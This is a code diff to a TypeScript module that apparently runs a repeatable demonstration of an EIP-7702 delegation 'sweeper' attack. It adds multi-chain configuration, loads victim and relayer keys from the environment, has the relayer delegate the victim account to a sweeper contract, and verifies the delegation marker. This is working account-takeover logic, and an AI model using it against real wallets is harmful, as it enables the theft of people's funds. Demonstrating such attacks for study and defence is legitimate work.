@@ -1,9 +1,8 @@
-import { parseUnits, formatUnits, encodeFunctionData, keccak256, type Hex } from "viem";
+import { parseUnits, formatUnits, encodeFunctionData, keccak256, createPublicClient, createWalletClient, http, defineChain, type Hex } from "viem";
 import { privateKeyToAccount } from "viem/accounts";
-import { publicClient, walletClient, getChain } from "./chain";
-import { getConfig } from "./runtime";
 import { ERC20_ABI, SWEEPER_ABI } from "./abi";
 import { arkivEnabled, recordDelegation, upsertDelegate } from "./arkiv";
+import { chainConfig, WHITECHAIN_ID } from "./chains";
 import type { Emit } from "./types";
 
 const NUM_AUTHS = 50;
@@ -30,20 +29,26 @@ function env(k: string) {
  * repeatable. The relayer pays gas and broadcasts; the attacker + contracts
  * come from `npm run setup` / deploy.
  */
-export async function runAttack(emit: Emit, signal?: AbortSignal) {
+export async function runAttack(emit: Emit, signal?: AbortSignal, chainId?: number) {
   const E = (e: Parameters<Emit>[0]) => emit({ t: Date.now(), ...e });
   const abortIf = () => { if (signal?.aborted) throw new DOMException("aborted", "AbortError"); };
 
-  const chain = getChain();
-  const cfg = getConfig(); // current run's addresses (swapped by /api/reset)
+  // Per-network selection; unknown/omitted chain -> Whitechain. Contracts (token/sweeper/attacker)
+  // come from the registry; the relayer and victim keys are shared across networks (from env).
+  const net = chainConfig(chainId);
+  const chain = defineChain({
+    id: net.id, name: net.name,
+    nativeCurrency: net.id === WHITECHAIN_ID ? { name: "WhiteBIT Coin", symbol: "WBT", decimals: 18 } : { name: "Ether", symbol: "ETH", decimals: 18 },
+    rpcUrls: { default: { http: [net.rpc] } },
+  });
   const relayer = privateKeyToAccount(env("RELAYER_PK") as `0x${string}`);
-  const attacker = cfg.attacker;
-  const sweeper = cfg.sweeper;
-  const tusd = cfg.tusd;
-  const victim = privateKeyToAccount(cfg.victimPk); // fixed victim (persistent on-chain balance)
+  const victim = privateKeyToAccount(env("VICTIM_PK") as `0x${string}`); // fixed victim (persistent per chain)
+  const attacker = net.attacker;
+  const sweeper = net.sweeper;
+  const tusd = net.token;
 
-  const pub = publicClient();
-  const wallet = walletClient(relayer);
+  const pub = createPublicClient({ chain, transport: http(net.rpc) });
+  const wallet = createWalletClient({ account: relayer, chain, transport: http(net.rpc) });
 
   E({ step: "setup", msg: "Actors loaded", victim: victim.address, relayer: relayer.address, attacker, sweeper, tusd });
 
@@ -80,8 +85,15 @@ export async function runAttack(emit: Emit, signal?: AbortSignal) {
   const dRc = await pub.waitForTransactionReceipt({ hash: dHash });
   E({ step: "delegate-mined", msg: "Delegation mined", block: Number(dRc.blockNumber), status: dRc.status });
 
-  const code = await pub.getCode({ address: victim.address });
-  const delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  // Poll getCode until the read RPC reflects the delegation — public RPCs are eventually consistent,
+  // so a confirmed receipt doesn't mean the next getCode shows the new code.
+  let code = await pub.getCode({ address: victim.address });
+  let delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  for (let i = 0; i < 12 && !delegated; i++) {
+    await sleep(1500);
+    code = await pub.getCode({ address: victim.address });
+    delegated = !!code && code.toLowerCase().startsWith("0xef0100");
+  }
   E({ step: "verify", msg: delegated ? "Victim account is now DELEGATED to the sweeper (0xef0100 marker present)" : "No delegation marker found", delegated, code });
   if (!delegated) { E({ step: "error", msg: "Delegation did not take effect (check CHAIN_ID / nonce / RPC supports type-4)." }); return; }
   abortIf();
